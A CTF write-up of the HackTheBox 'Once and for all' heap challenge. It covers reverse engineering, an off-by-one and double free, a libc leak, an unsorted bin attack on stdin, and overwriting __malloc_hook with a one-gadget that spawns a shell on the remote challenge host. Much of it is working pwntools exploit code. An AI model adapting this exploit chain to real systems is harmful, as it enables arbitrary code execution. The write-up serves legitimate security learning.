---
createdAt: 2022-05-19
title: "[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all"
type: 'Writeups'
tags: ["pwn"]
---

Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.
Find the tasks and the final exploit [here](https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/) and [here](https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/exploit.py).

# Reverse engineering

All the snippets of pseudo-code are issued by [IDA freeware](https://hex-rays.com/ida-free/):
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+18h] [rbp-8h] BYREF
  int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; i <= 49; ++i )
  {
    puts(s);
    printf(&unk_1310);
    __isoc99_scanf(&unk_13C8, &v4);
    puts(s);
    switch ( v4 )
    {
      case 1:
        small_alloc(s);
        break;
      case 2:
        fix(s);
        break;
      case 3:
        examine(s);
        break;
      case 4:
        savebig(s);
        break;
      case 5:
        exit(0);
      default:
        puts("[-] Invalid choice!");
        break;
    }
  }
  return 0;
}
```

The binary allows you to allocate a small chunk beetween `0x1f` and `0x38` bytes:
```c
int small_alloc()
{
  __int64 v1; // rbx
  size_t nmemb; // [rsp+0h] [rbp-20h] BYREF
  __int64 idx[3]; // [rsp+8h] [rbp-18h] BYREF

  if ( allocated == 15 )
    return puts("Nothing more!");
  ++allocated;
  printf("Choose an index: ");
  __isoc99_scanf("%lu", idx);
  if ( size_array[2 * idx[0]] || (&alloc_array)[2 * idx[0]] || idx[0] > 0xEuLL )
    return puts("[-] Invalid!");
  printf("\nHow much space do you need for it: ");
  __isoc99_scanf("%lu", &nmemb);
  if ( nmemb <= 0x1F || nmemb > 0x38 )
    return puts("[-] Your inventory cannot provide this type of space!");
  size_array[2 * idx[0]] = nmemb;
  v1 = idx[0];
  (&alloc_array)[2 * v1] = (void **)calloc(nmemb, 1uLL);
  if ( !(&alloc_array)[2 * idx[0]] )
  {
    puts("[-] Something didn't work out...");
    exit(-1);
  }
  puts("Input your weapon's details: ");
  
  # off-by-one
  return read(0, (&alloc_array)[2 * idx[0]], nmemb + 1);
}
```

As you can see right above this function contains an off-by-one vulnerability, which means we can write only one byte right after the allocated chunk, overlapping the size field of the next chunk / top chunk.


The fix function frees a chunk and asks for another size, then it allocates another chunk with `calloc`.
```c
int fix()
{
  int result; // eax
  unsigned __int64 v1; // rbx
  unsigned __int64 idx; // [rsp+8h] [rbp-28h] BYREF
  size_t size; // [rsp+10h] [rbp-20h] BYREF
  __int64 v4[3]; // [rsp+18h] [rbp-18h] BYREF

  printf("Choose an index: ");
  __isoc99_scanf("%lu", &idx);
  if ( !size_array[2 * idx] || !alloc_array[2 * idx] || idx > 0xE )
    return puts("[-] Invalid!");
  puts("Ok, let's get you some new parts for this one... seems like it's broken");
  free(alloc_array[2 * idx]);
  printf("\nHow much space do you need for this repair: ");
  __isoc99_scanf("%lu", &size);
  if ( size <= 0x1F || size > 0x38 )
    # [1] 
    return puts("[-] Your inventory cannot provide this type of space.");
  size_array[2 * idx] = size;
  v1 = idx;
  alloc_array[2 * v1] = calloc(size, 1uLL);
  if ( !alloc_array[2 * idx] )
  {
    puts("Something didn't work out...");
    exit(-1);
  }
  puts("Input your weapon's details: ");
  read(0, alloc_array[2 * idx], size);
  printf("What would you like to do now?\n1. Verify weapon\n2. Continue\n>> ");
  __isoc99_scanf("%lu", v4);
  result = v4[0];
  if ( v4[0] == 1 )
  {
    if ( verified )
    {
      return puts(&unk_1648);
    }
    else
    {
      result = puts((const char *)alloc_array[2 * idx]);
      verified = 1;
    }
  }
  return result;
}
```
If we reach `[1]`, `alloc_array[2 * idx]` is freed leading to a double free.

We can print a chunk only one time:
```c
int examine()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h] BYREF

  if ( examined )
    return puts(&unk_14D0);
  examined = 1;
  printf("Choose an index: ");
  __isoc99_scanf("%lu", &v1);
  if ( size_array[2 * v1] && alloc_array[2 * v1] && v1 <= 0xE )
    return puts((const char *)alloc_array[2 * v1]);
  else
    return puts("[-] Invalid!");
}
```

Finally we can malloc a huge chunk, but we cannot wriet anything within:
```c
int savebig()
{
  void *v0; // rax
  size_t size; // [rsp+8h] [rbp-8h] BYREF

  if ( chungus_weapon || qword_202068 )
  {
    LODWORD(v0) = puts(&unk_16E8);
  }
  else
  {
    printf("How much space do you need for this massive weapon: ");
    __isoc99_scanf("%lu", &size);
    if ( (unsigned __int16)size > 0x5AFu && (unsigned __int16)size <= 0xF5C0u )
    {
      puts("Adding to your inventory..");
      chungus_weapon = size;
      v0 = malloc(size);
      qword_202068 = (__int64)v0;
    }
    else
    {
      LODWORD(v0) = puts("[-] This is not possible..");
    }
  }
  return (int)v0;
}
```

# Exploitation

## What we have

- An off-by-one when we create a new chunk
- Double free by calling `fix` and then providing an invalid size.
- Trivial read after free thanks to the double free.

## Restrictions

- The program does not use `printf` with a format specifer, then we cannot do a [House of husk](https://maxwelldulin.com/BlogPost?post=3107454976).
- We can only allocate `15` chunks.
- All the allocations except the big one are made using `calloc`, even if it can be easily bypassed by adding the `IS_MAPPED` flag to the chunk header to avoid zero-ing.
- The libc version (`2.27`) mitigates a few techniques, especially the [House of Orange](https://1ce0ear.github.io/2017/11/26/study-house-of-orange/) and introduces the `tcache`.
- Allocations have to fit in only two fastbins (`0x30` / `0x40`), which means we cannot get an arbitrary with a `fastbin dup` technique due to the size of most of interesting memory areas in the libc (`0x7f` => `0x70` fastbin against `0x30` / `0x40` in our case).

## How to leak libc ?

Partial overwrites are as far as I know very hard to get because of `calloc`. The first thing to do is to leak libc addresses to then target libc global variables / structures. The classic way to get a libc leak is to free a chunk that belongs to the unsorted bin and then print it. But as seen previously, we cannot allocate a large chunks that would end up in the unsorted bin. To do so we have to use the off-by-one bug to overwrite the next chunk's size field with a bigger one that would correspond to the unsorted bin (` >= 0x90 `). We can edit the size of the second chunk from `0x30` to `0xb0` by doing:
```py
def add(idx, size, data, hang=False):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"Choose an index: ", str(idx).encode())
    io.sendlineafter(b"How much space do you need for it: ", str(size).encode())
    if hang == True:
        return

    io.sendlineafter(b"Input your weapon's details: \n", data)

def freexalloc(idx, size, data, doubleFree=False):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"Choose an index: ", str(idx).encode())
    io.sendlineafter(b"How much space do you need for this repair: ", str(size).encode())

    if doubleFree:
        return

    io.sendlineafter(b"Input your weapon's details: \n", data)
    io.sendlineafter(b">> ", b"1")

def show(idx):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"Choose an index: ", str(idx).encode())

def allochuge(size):
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b"How much space do you need for this massive weapon: ", str(size).encode())

# get libc leak

add(0, 56, b"A"*55)
add(1, 56, b"B"*39)
add(2, 40, b"C"*39) # size
add(4, 56, b"D"*(0x10))
add(5, 40, b"E"*39)

add(10, 40, pwn.p64(0) + pwn.p64(0x21)) # barrier

# freexalloc(5, 560, b"", doubleFree=True)

freexalloc(1, 560, b"", doubleFree=True)
freexalloc(0, 560, b"", doubleFree=True)
freexalloc(2, 560, b"", doubleFree=True)

freexalloc(1, 560, b"", doubleFree=True)
add(6, 56, b"\x00"*56  + b"\xb1") # fake unsorted chunk

"""
0x555555608560:	0x0000000000000000	0x0000000000000041 [0]
0x555555608570:	0x00005555556085a0	0x4141414141414141
0x555555608580:	0x4141414141414141	0x4141414141414141
0x555555608590:	0x4141414141414141	0x4141414141414141
0x5555556085a0:	0x0a41414141414141	0x0000000000000041 [1]
0x5555556085b0:	0x0000000000000000	0x0000000000000000
0x5555556085c0:	0x0000000000000000	0x0000000000000000
0x5555556085d0:	0x0000000000000000	0x0000000000000000
0x5555556085e0:	0x0000000000000000	0x00000000000000b1 [2] <- Fake size | PREV_INUSE (1)
0x5555556085f0:	0x0000000000000000	0x4343434343434343	 
0x555555608600:	0x4343434343434343	0x4343434343434343	 
0x555555608610:	0x0a43434343434343	0x0000000000000041 [3]	 
0x555555608620:	0x4444444444444444	0x4444444444444444	 
0x555555608630:	0x000000000000000a	0x0000000000000000
0x555555608640:	0x0000000000000000	0x0000000000000000	 
0x555555608650:	0x0000000000000000	0x0000000000000031 [4]	 
0x555555608660:	0x4545454545454545	0x4545454545454545	 
0x555555608670:	0x4545454545454545	0x4545454545454545	 
0x555555608680:	0x0a45454545454545	0x0000000000000031 [10]	 
0x555555608690:	0x0000000000000000	0x0000000000000021 <- Fake chunk header 
0x5555556086a0:	0x000000000000000a	0x0000000000000000
0x5555556086b0:	0x0000000000000000	0x0000000000020951 <- Top chunk


fastbins
0x30: 0x5555556085e0 ◂— 0x0
0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
"""

```

We allocate 6 chunks, we do need of 6 chunks because of the fake size we write on `chunk_2` (`&chunk_2` + `0xb0` = `0x555555608690`, in the last chunk near the top chunk). In the same way we craft a fake header in the body of the last chunk to avoid issues during the release of `chunk_2`. If you're not familiar with the security checks done by `malloc` and `free`, I would advise you to take a look at [this resource](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks).

Now that `chunk_2` has been tampered with a fake `0xb0` size, we just have to free it 8 times (to fill the tcache) to put it in the unsorted bin:
```py
freexalloc(2, 560, b"", doubleFree=True)
freexalloc(2, 560, b"", doubleFree=True)
freexalloc(2, 560, b"", doubleFree=True)
freexalloc(2, 560, b"", doubleFree=True)
freexalloc(2, 560, b"", doubleFree=True)
freexalloc(2, 560, b"", doubleFree=True)
freexalloc(2, 560, b"", doubleFree=True)

freexalloc(2, 560, b"", doubleFree=True)
# falls into the unsortedbin

show(2)

libc = pwn.u64(io.recvline()[:-1].ljust(8, b"\x00")) - 0x3ebca0 # offset of the unsorted bin

stdin = libc + 0x3eba00
pwn.log.info(f"libc: {hex(libc)}")

"""
0x555555608560:	0x0000000000000000	0x0000000000000041
0x555555608570:	0x00005555556085a0	0x4141414141414141
0x555555608580:	0x4141414141414141	0x4141414141414141
0x555555608590:	0x4141414141414141	0x4141414141414141
0x5555556085a0:	0x0a41414141414141	0x0000000000000041
0x5555556085b0:	0x0000000000000000	0x0000000000000000
0x5555556085c0:	0x0000000000000000	0x0000000000000000
0x5555556085d0:	0x0000000000000000	0x0000000000000000
0x5555556085e0:	0x0000000000000000	0x00000000000000b1
0x5555556085f0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555608600:	0x4343434343434343	0x4343434343434343
0x555555608610:	0x0a43434343434343	0x0000000000000041
0x555555608620:	0x4444444444444444	0x4444444444444444
0x555555608630:	0x000000000000000a	0x0000000000000000
0x555555608640:	0x0000000000000000	0x0000000000000000
0x555555608650:	0x0000000000000000	0x0000000000000031
0x555555608660:	0x4545454545454545	0x4545454545454545
0x555555608670:	0x4545454545454545	0x4545454545454545
0x555555608680:	0x0a45454545454545	0x0000000000000031
0x555555608690:	0x00000000000000b0	0x0000000000000020
0x5555556086a0:	0x000000000000000a	0x0000000000000000
0x5555556086b0:	0x0000000000000000	0x0000000000020951

unsortedbin
all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
tcachebins
0xb0 [  7]: 0x5555556085f0 —▸ 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556086b0 ◂— 0x0
"""
```

Which gives:
```Shell
nasm@off:~/Documents/pwn/HTB/apocalypse/onceAndmore$ python3 exploit.py LOCAL GDB NOASLR
[*] '/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/out'
[!] Debugging process with ASLR disabled
[+] Starting local process '/usr/bin/gdbserver': pid 31378
[*] running in new terminal: ['/usr/bin/gdb', '-q', '/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all', '-x', '/tmp/pwn1z_5e0ie.gdb']
[*] libc: 0x7ffff79e4000
```

We now have achieved the first step of the challenge: leak the libc base address.

## What can we target in the libc ?

There are a lot of ways to achieve code execution according to what I red in other write-ups, I choose to attack `_IO_stdin` by running an unsorted bin attack on its `_IO_buf_end` field which holds the end of the internal buffer of `stdin` from `_IO_buf_base`, according to the [glibc source code](https://elixir.bootlin.com/glibc/glibc-2.27/source/libio/fileops.c#L469):
```c
int
_IO_new_file_underflow (_IO_FILE *fp)
{
  _IO_ssize_t count;
#if 0
  /* SysV does not make this test; take it out for compatibility */
  if (fp->_flags & _IO_EOF_SEEN)
    return (EOF);
#endif

  if (fp->_flags & _IO_NO_READS)
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }

  /* Flush all line buffered files before reading. */
  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
#if 0
      _IO_flush_all_linebuffered ();
#else
      /* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */
      _IO_acquire_lock (_IO_stdout);

      if ((_IO_stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
	  == (_IO_LINKED | _IO_LINE_BUF))
	_IO_OVERFLOW (_IO_stdout, EOF);

      _IO_release_lock (_IO_stdout);
#endif
    }

  _IO_switch_to_get_mode (fp);

  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);
  if (count <= 0)
    {
      if (count == 0)
	fp->_flags |= _IO_EOF_SEEN;
      else
	fp->_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp->_IO_read_end += count;
  if (count == 0)
    {
      /* If a stream is read to EOF, the calling application may switch active
	 handles.  As a result, our offset cache would no longer be valid, so
	 unset it.  */
      fp->_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);
  return *(unsigned char *) fp->_IO_read_ptr;
}
```

The interesting part is the `count = _IO_SYSREAD (fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base);` which reads `fp->_IO_buf_end - fp->_IO_buf_base` bytes in `fp->_IO_buf_base`. Which means if `fp->_IO_buf_end` is replaced with the help of an unsorted bin attack by the address of the unsorted bin and that `&unsorted bin > fp->_IO_buf_base`, we can trigger an out of bound write from a certain address up to the address of the unsorted bin. We can inspect the layout in gdb to see what's actually going on:
```
pwndbg> x/100gx stdin
0x7ffff7dcfa00 <_IO_2_1_stdin_>:	0x00000000fbad208b	0x00007ffff7dcfa83
0x7ffff7dcfa10 <_IO_2_1_stdin_+16>:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa20 <_IO_2_1_stdin_+32>:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa30 <_IO_2_1_stdin_+48>:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
0x7ffff7dcfa40 <_IO_2_1_stdin_+64>:	0x00007ffff7dcfa84	0x0000000000000000
0x7ffff7dcfa50 <_IO_2_1_stdin_+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfa60 <_IO_2_1_stdin_+96>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfa70 <_IO_2_1_stdin_+112>:	0x0000001000000000	0xffffffffffffffff
0x7ffff7dcfa80 <_IO_2_1_stdin_+128>:	0x000000000a000000	0x00007ffff7dd18d0
0x7ffff7dcfa90 <_IO_2_1_stdin_+144>:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dcfaa0 <_IO_2_1_stdin_+160>:	0x00007ffff7dcfae0	0x0000000000000000
0x7ffff7dcfab0 <_IO_2_1_stdin_+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfac0 <_IO_2_1_stdin_+192>:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dcfad0 <_IO_2_1_stdin_+208>:	0x0000000000000000	0x00007ffff7dcc2a0
0x7ffff7dcfae0 <_IO_wide_data_0>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfaf0 <_IO_wide_data_0+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb00 <_IO_wide_data_0+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb10 <_IO_wide_data_0+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb20 <_IO_wide_data_0+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb30 <_IO_wide_data_0+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb40 <_IO_wide_data_0+96>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb50 <_IO_wide_data_0+112>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb60 <_IO_wide_data_0+128>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb70 <_IO_wide_data_0+144>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb80 <_IO_wide_data_0+160>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfb90 <_IO_wide_data_0+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfba0 <_IO_wide_data_0+192>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbb0 <_IO_wide_data_0+208>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbc0 <_IO_wide_data_0+224>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbd0 <_IO_wide_data_0+240>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbe0 <_IO_wide_data_0+256>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfbf0 <_IO_wide_data_0+272>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc00 <_IO_wide_data_0+288>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc10 <_IO_wide_data_0+304>:	0x00007ffff7dcbd60	0x0000000000000000
0x7ffff7dcfc20 <__memalign_hook>:	0x00007ffff7a7b410	0x00007ffff7a7c790
0x7ffff7dcfc30 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc40 <main_arena>:	0x0000000000000000	0x0000000000000001
0x7ffff7dcfc50 <main_arena+16>:	0x0000000000000000	0x00005555556085e0
0x7ffff7dcfc60 <main_arena+32>:	0x0000555555608560	0x0000000000000000
0x7ffff7dcfc70 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc80 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc90 <main_arena+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfca0 <main_arena+96>:	0x00005555556086b0	<- &unsortedbin = 0x7ffff7dcfca0
pwndbg> p *stdin
$1 = {
  _flags = -72540021,
  _IO_read_ptr = 0x7ffff7dcfa83 <_IO_2_1_stdin_+131> "\n",
  _IO_read_end = 0x7ffff7dcfa83 <_IO_2_1_stdin_+131> "\n",
  _IO_read_base = 0x7ffff7dcfa83 <_IO_2_1_stdin_+131> "\n",
  _IO_write_base = 0x7ffff7dcfa83 <_IO_2_1_stdin_+131> "\n",
  _IO_write_ptr = 0x7ffff7dcfa83 <_IO_2_1_stdin_+131> "\n",
  _IO_write_end = 0x7ffff7dcfa83 <_IO_2_1_stdin_+131> "\n",
  _IO_buf_base = 0x7ffff7dcfa83 <_IO_2_1_stdin_+131> "\n",
  _IO_buf_end = 0x7ffff7dcfa84 <_IO_2_1_stdin_+132> "",
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x0,
  _fileno = 0,
  _flags2 = 16,
  _old_offset = -1,
  _cur_column = 0,
  _vtable_offset = 0 '\000',
  _shortbuf = "\n",
  _lock = 0x7ffff7dd18d0 <_IO_stdfile_0_lock>,
  _offset = -1,
  _codecvt = 0x0,
  _wide_data = 0x7ffff7dcfae0 <_IO_wide_data_0>,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0,
  _mode = -1,
  _unused2 = '\000' <repeats 19 times>
}
```

As you can see right above and according to the source code showed previously, `_IO_stdin->_IO_buf_base` points toward `_IO_stdin->_shortbuf`, an internal buffer directly in `stdin`. And `&unsortedbin > _IO_buf_base > stdin`. If you do not understand fully my explanations, I advise you to take a look at [this great article](https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/).

Then we should be able to control every bytes between `&stdin->_shortbuf` and `&unsortedbin`. And the incredible thing to note is that in this small range, there is what every heap pwner is always looking for: `__malloc_hook` !!

Then we just have to overwrite the pointers inside `stdin`, `_IO_wide_data_0` and `__memalign_hook` to finally reach `__malloc_hook` and write the address of a one-gadget !

## Unsorted bin attack on stdin->_IO_buf_end

Here was theory, let's see how we can do that. To understand unsorted bin attack [here](https://squarepants0.github.io/2020/10/20/unsorted-bin-attack/) is a good article about unsorted bin attack. The unsorted bin attack using partial unlink is basically:
- overwrite the backward pointer of the last chunk in the unsorted bin by `&target - 0x10`
- request the **exact** size of the last chunk in the unsorted bin
- It should write at `&target` the address of the unsorted bin

An essential thing to note is that if there is no chunks in your fastbin / smallbin and that you're requesting a fastbin/smallbin-sized chunk, the unsorted bin will be inspected and if the last chunk doesn't fit the request, the program will most of the time issues a `malloc(): memory corruption`. Anyway the best thing to do is to take a look at the [code](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3519):
```c
static void *
_int_malloc (mstate av, size_t bytes)
{

// It checks first fastbin then smallbin then unsorted bin

for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
              || __builtin_expect (chunksize_nomask (victim)
				   > av->system_mem, 0))
            malloc_printerr ("malloc(): memory corruption");
          size = chunksize (victim);

          /*
             If a small request, try to use last remainder if it is the
             only chunk in unsorted bin.  This helps promote locality for
             runs of consecutive small requests. This is the only
             exception to best-fit, and applies only when there is
             no exact fit for a small chunk.
           */

          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
              /* split and reattach remainder */
              remainder_size = size - nb;
              remainder = chunk_at_offset (victim, nb);
              unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
              av->last_remainder = remainder;
              remainder->bk = remainder->fd = unsorted_chunks (av);
              if (!in_smallbin_range (remainder_size))
                {
                  remainder->fd_nextsize = NULL;
                  remainder->bk_nextsize = NULL;
                }

              set_head (victim, nb | PREV_INUSE |
                        (av != &main_arena ? NON_MAIN_ARENA : 0));
              set_head (remainder, remainder_size | PREV_INUSE);
              set_foot (remainder, remainder_size);

              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }

          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);

          /* Take now instead of binning if exact fit */

          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
		set_non_main_arena (victim);
#if USE_TCACHE
	      /* Fill cache first, return to user only if cache fills.
		 We may return one of these chunks later.  */
	      if (tcache_nb
		  && tcache->counts[tc_idx] < mp_.tcache_count)
		{
		  tcache_put (victim, tc_idx);
		  return_cached = 1;
		  continue;
		}
	      else
		{
#endif
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
#if USE_TCACHE
		}
#endif
            }

	[...]
}
```

According to what I said earlier, the goal is to replace `stdin->_IO_buf_end` with `&unsortedbin` which means we have to write to the backward pointer of the last chunk in the unsorted bin (chunk_2) `&stdin->_IO_buf_end - 0x10`. To do so we can trigger a write after free primitive by taking back `chunk_2` from the unsorted bin to the fastbin:
```py
"""
Before:
0x30: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
unsortedbin
all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
"""

add(7, 56, b"A"*55) # pop it to access to chunk_1

add(8, 56, b"A"*56 + b"\x31") # restore valid fastbin chunk part of the 0x30 freelist
# put it back to the fastbin 

add(9, 40, pwn.p64(libc + 0x3ebca0) + pwn.p64(stdin + 0x40 - 0x10))
# Write after free, &stdin->_IO_buf_end = stdin + 0x40, minus 0x10 point to the fake header

"""
After:
0x30: 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556085e0 ◂— 0x7ffff7dcfca0
unsortedbin
all [corrupted]
FD: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
BK: 0x5555556085e0 —▸ 0x7ffff7dcfa30 (_IO_2_1_stdin_+48) ◂— 0x0
"""
```
As you can read right above, the `chunk_2` has its backward pointer set to `&stdin->_IO_buf_end - 0x10`. To achieve the partial unlink we just have to request a `0x30` sized chunk with nothing in the fastbin freelists. That's the last step of the unsortedbin attack, clean out the fastbin:
```py
"""
Before: same as above
"""

# == clean fastbin

freexalloc(5, 560, b"", doubleFree=True)

freexalloc(4, 560, b"", doubleFree=True)
add(11, 56, b"1"*56 + b"\x40")

freexalloc(5, 560, b"", doubleFree=True)
add(12, 56, pwn.p64(0))

freexalloc(4, 560, b"", doubleFree=True)
add(13, 56, b"1"*56 + b"\x30")

add(14, 40, b"1"*10)

# == clean fastbin

"""
fastbins
0x30: 0x0
0x40: 0x0
"""
```

Now we just have to ask for a `0x30` sized chunk:
```py
add(3, 40, b"1337", hang=True)
pwn.log.info(f"unsortedbin attack done on: {hex(stdin + 0x40 - 0x10)}")
pwn.log.info(f"Enjoy your shell!")

"""
After:
0x7ffff7dcfa40 <_IO_2_1_stdin_+64>:	0x00007ffff7dcfca0 <- stdin->_IO_buf_end
0x7ffff7dcfca0 <main_arena+96>:	0x00005555556086b0 <- unsortedbin
"""
```

## FSOP + PROFIT

The last part is very easy, we just have to overflow up to `&__malloc_hook` to write the one-gadget:
```py
io.sendline(b"") 
io.recvuntil(b">> ") 
io.send( 
        b"4\n\x00\x00\x00" + 
        pwn.p64(libc + 0x3ed8d0) + 
        pwn.p64(0xffffffffffffffff) + 
        pwn.p64(0) + 
        pwn.p64(libc + 0x3ebae0) + 
        pwn.p64(0) * 3 + 
        pwn.p64(0x00000000ffffffff) + 
        pwn.p64(0) * 2 + 
        pwn.p64(libc + 0x3e82a0) + 
        pwn.p8(0) * 0x150 +  
        # !!!!! 
        pwn.p64(libc + 0x10a38c) # <- one-gadget
        #pwn.p64(libc + 0x4f322) 
        # pwn.p64(0x1337) 
        )
"""
0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
```

The `4\n\x00\x00\x00` corresponds to the option that asks for the huge chunk (we cannot allocate standards chunks anymore) which will trigger `__malloc_hook` :).

Which gives:
```
root@3b9bf5405b71:/mnt# python3 exploit.py REMOTE HOST=167.172.56.180 PORT=30332
[*] '/mnt/once_and_for_all'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'/mnt/out'
[+] Opening connection to 167.172.56.180 on port 30332: Done
[*] Switching to interactive mode

How much space do you need for this massive weapon: Adding to your inventory..
$ id
uid=100(ctf) gid=101(ctf)
$ ls
flag.txt
glibc
once_and_for_all
$ cat flag.txt
HTB{m4y_th3_f0rc3_b3_w1th_B0Nn13!}
```

Find the tasks and the final exploit [here](https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/) and [here](https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/exploit.py).
